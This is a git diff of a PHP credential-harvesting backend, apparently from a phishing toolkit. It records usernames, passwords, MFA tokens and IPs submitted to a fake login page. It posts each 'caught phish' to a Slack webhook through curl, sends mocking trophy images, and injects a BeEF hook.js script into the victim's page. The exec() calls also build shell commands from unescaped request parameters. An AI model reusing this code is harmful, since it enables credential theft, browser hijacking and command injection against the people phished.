@@ -1,17 +1,5 @@
 <?php
 
-// Set Slack Webhook URL
-$slackurl = "https://hooks.slack.com/services/YOUR_SLACK_INCOMING_WEBHOOK_URL_HERE";
-$slackchannel = "#YOUR_SLACK_CHANNEL_HERE";
-$slackemoji = ":fishing_pole_and_fish:";
-$slackbotname = "PhishBot";
-// OR BOT TOKEN
-$SlackLegacyToken = "YOUR_SLACK_LEGACY_TOKEN_OR_SLACKBOT_TOKEN_HERE";
-
-// Set Optional BEEF Hook URL
-//$BEEFUrl = "https://YOUR_DOMAIN_HERE.com:3000/hook.js";
-$BEEFUrl = "";
-
 // Receives Required Parameters and Sets Variables
 $ip = $_SERVER['REMOTE_ADDR'];
 $user = $_REQUEST['username'];
@@ -21,14 +9,14 @@ $redirect = $_REQUEST['redirect'];
 
 // Receives Optional Parameters and Overrides Variables
 if(isset($_REQUEST['token'])){$MFAToken = $_REQUEST['token'];}else{$MFAToken = "";}
-if(isset($_REQUEST['slackemoji'])){$slackemoji = $_REQUEST['slackemoji'];}
-if(isset($_REQUEST['slackbotname'])){$slackbotname = $_REQUEST['slackbotname'];}
+if(isset($_REQUEST['slackemoji'])){$slackemoji = $_REQUEST['slackemoji'];}else{$slackemoji = ":fishing_pole_and_fish:";}
+if(isset($_REQUEST['slackbotname'])){$slackbotname = $_REQUEST['slackbotname'];}else{$slackbotname = "PhishBot";}
 
 // Makes Password Safe for DB
 $user = stripslashes($user);
 
 // Pulls in Required Connection Variables for DB
-require_once 'dbconfig.php';
+require_once 'config.php';
 
 // Create connection
 $conn = mysqli_connect($servername, $username, $password, $dbname);
@@ -53,24 +41,24 @@ $resulttrophy = $conn->query($sqltrophy);
 while($row = $resulttrophy->fetch_assoc()) {
 
 if($row["Title"] == "MostDedicated"){
-$cmdtrophy = "curl -F file=@awardgifs/TrophyMostDedicated.gif -F 'initial_comment=Third Times a Charm! - ".$user." @ ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackLegacyToken."' https://slack.com/api/files.upload";
+$cmdtrophy = "curl -F file=@awardgifs/TrophyMostDedicated.gif -F 'initial_comment=Third Times a Charm! - ".$user." @ ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackBotOrLegacyToken."' https://slack.com/api/files.upload";
 exec($cmdtrophy);
 }
 
 
 if($row["Title"] == "MostDelayed"){
-$cmdtrophy2 = "curl -F file=@awardgifs/TrophyMostDelayed.gif -F 'initial_comment=Partys over! - ".$user." @ ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackLegacyToken."' https://slack.com/api/files.upload";
+$cmdtrophy2 = "curl -F file=@awardgifs/TrophyMostDelayed.gif -F 'initial_comment=Partys over! - ".$user." @ ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackBotOrLegacyToken."' https://slack.com/api/files.upload";
 exec($cmdtrophy2);
 }
 
 if($row["Title"] == "MostDisclosedPWs"){
-$cmdtrophy3 = "curl -F file=@awardgifs/TrophyMostDisclosed.gif -F 'initial_comment=Here Try This One.. - ".$user." @ ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackLegacyToken."' https://slack.com/api/files.upload";
+$cmdtrophy3 = "curl -F file=@awardgifs/TrophyMostDisclosed.gif -F 'initial_comment=Here Try This One.. - ".$user." @ ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackBotOrLegacyToken."' https://slack.com/api/files.upload";
 exec($cmdtrophy3);
 }
 
 
 if($row["Title"] == "MostPhish"){
-$cmdtrophy4 = "curl -F file=@awardgifs/TrophyMostPhish.gif -F 'initial_comment=Gonna need a bigger boat.. ".$row["username"]." phish! - ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackLegacyToken."' https://slack.com/api/files.upload";
+$cmdtrophy4 = "curl -F file=@awardgifs/TrophyMostPhish.gif -F 'initial_comment=Gonna need a bigger boat.. ".$row["username"]." phish! - ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackBotOrLegacyToken."' https://slack.com/api/files.upload";
 exec($cmdtrophy4);
 }
 
@@ -171,7 +159,7 @@ body {
 
 <!--<iframe src="unc.php" width="0" height="0" frameborder="0" sandbox="allow-forms allow-scripts"></iframe>-->
 
-<script src="https://<?php echo $_SERVER['SERVER_NAME'];?>:3000/hook.js" type="text/javascript"></script>
+<script src="<?php echo $BeefHookJSURL;?>:3000/hook.js" type="text/javascript"></script>
 
 </BODY>
 </HTML>
@@ -227,7 +215,7 @@ $haveibeenpwnedhits = $arraywithcount[substr($sha1pass, 5)];
 
 // If the Password is so non-unique, give a Trophy
 if ($haveibeenpwnedhits >= "3000"){
-$cmdtrophy5 = "curl -F file=@awardgifs/TrophyLeastUniquePassword.gif -F 'initial_comment=That PW Gets Around.. (".$haveibeenpwnedhits." times!) - ".$user." @ ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackLegacyToken."' https://slack.com/api/files.upload";
+$cmdtrophy5 = "curl -F file=@awardgifs/TrophyLeastUniquePassword.gif -F 'initial_comment=That PW Gets Around.. (".$haveibeenpwnedhits." times!) - ".$user." @ ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackBotOrLegacyToken."' https://slack.com/api/files.upload";
 exec($cmdtrophy5);
 }
 
@@ -246,7 +234,7 @@ $message = "> Caught Another Phish at ".$portal."! (<".$slacklink."|".$user.">)"
 if($TroyHunt == "yes"){$message = $message."\r\n> *_HaveIBeenPwned Hit_* (".$haveibeenpwnedhits.")";}
 
 // Execute Slack Incoming Webhook
-$cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$slackchannel.'", "username": "'.$slackbotname.'", "text": "'.$message.'", "icon_emoji": "'.$slackemoji.'"}\' '.$slackurl.'';
+$cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$slackchannel.'", "username": "'.$slackbotname.'", "text": "'.$message.'", "icon_emoji": "'.$slackemoji.'"}\' '.$SlackIncomingWebhookURL.'';
 
 exec($cmd);
 
